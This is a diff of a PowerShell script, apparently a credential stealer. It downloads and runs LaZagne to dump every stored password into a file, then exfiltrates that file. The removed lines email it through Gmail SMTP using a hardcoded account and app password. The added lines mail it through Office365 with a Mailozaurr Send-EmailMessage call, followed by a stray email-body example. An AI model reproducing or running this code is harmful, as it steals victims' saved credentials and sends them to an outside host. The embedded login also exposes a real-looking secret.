@@ -94,30 +94,16 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 # Execute the executable and save output to a file
 & "$dir\lazagne.exe" all > "$dir\output.txt"
 
-# Exfiltrate the file
-#POST REQUEST
-#Invoke-WebRequest -Uri "http://IP:PORT0" -Method POST -Body Get-Content "$dir\output.txt"
-# Mail Exfiltration
-$EmailFrom = "herbertswindel@gmail.com"
-$EmailTo = "herbertswindel@outlook.com"
-$Subject = "Hier zijn uw gegevens kameraad!"
-$Body = "Met vriendelijke groet, Herbert"
-$SMTPServer = "smtp.gmail.com"
-
-$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587)
-$SMTPClient.EnableSsl = $true
-$SMTPClient.Credentials = New-Object System.Net.NetworkCredential("herbertswindel@gmail.com", "isqn febe cwja vatn")
-
-# Send the email with attachment
-$Attachment = "$dir\output.txt"
-$Message = New-Object Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body)
-$Message.Attachments.Add($Attachment)
-
-try {
-    $SMTPClient.Send($Message)
-    Write-Host "Email sent successfully."
-} catch {
-    Write-Host "Failed to send email. Error: $($_.Exception.Message)"
+if (-not $MailCredentials) {
+    $MailCredentials = Get-Credential
+}
+# this is simple replacement (drag & drop to Send-MailMessage)
+Send-EmailMessage -To 'herbertswindel@gmail.com' -Subject 'Test' -Body 'test me' -SmtpServer 'smtp.office365.com' -From 'herbertswindel@outlook.com' `
+    -Attachments "$dir\output.txt", "$PSScriptRoot\..\Mailozaurr.psm1" -Encoding UTF8 -Cc 'herbertswindel@outlook.com' -Priority High -Credential $MailCredentials `
+    -UseSsl -Port 587 -Verbose
+$Body = EmailBody {
+    EmailText -Text 'This is my text'
+    EmailTable -DataTable (Get-Process | Select-Object -First 5 -Property Name, Id, PriorityClass, CPU, Product)
 }
 
 # Clean up
